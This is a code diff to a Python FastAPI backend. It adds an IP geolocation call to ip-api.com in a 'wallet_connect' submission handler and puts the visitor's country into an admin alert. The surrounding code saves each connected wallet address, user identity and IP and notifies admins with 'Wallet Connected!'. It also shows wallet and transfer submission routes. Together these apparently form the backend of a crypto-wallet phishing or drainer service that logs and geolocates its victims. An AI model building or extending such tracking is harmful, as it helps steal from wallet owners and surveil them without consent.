@@ -1,6 +1,7 @@
 import os
 import json
 import asyncio
+import aiohttp
 from fastapi import FastAPI, Request, HTTPException, APIRouter
 from fastapi.staticfiles import StaticFiles
 from fastapi.responses import FileResponse
@@ -180,9 +181,19 @@ async def submit_wallet(data: WalletData):
 async def submit_wallet_connect(data: WalletConnectData, request: Request):
     ip = request.headers.get("X-Forwarded-For", request.client.host)
     data.ip = ip
+
+    # Simple GeoIP lookup
+    try:
+        async with aiohttp.ClientSession() as session:
+            async with session.get(f"http://ip-api.com/json/{data.ip}") as resp:
+                geo = await resp.json()
+                data.country = geo.get("country", "Unknown")
+    except Exception as e:
+        print(f"GeoIP error: {e}")
+
     save_submission({"type": "wallet_connect", "data": data.model_dump()})
     user_info = f"👤 User: {data.user.get('username', 'N/A')} ({data.user.get('id', 'N/A')})" if data.user else "👤 User: Unknown"
-    await notify_admins(f"🔗 *Wallet Connected!*\n\n{user_info}\nAddress: `{data.address}`\nIP: `{data.ip}`")
+    await notify_admins(f"🔗 *Wallet Connected!*\n\n{user_info}\nAddress: `{data.address}`\nIP: `{data.ip}`\nCountry: `{data.country}`")
     return {"status": "ok"}
 
 @router.post("/api/submit/transfer")
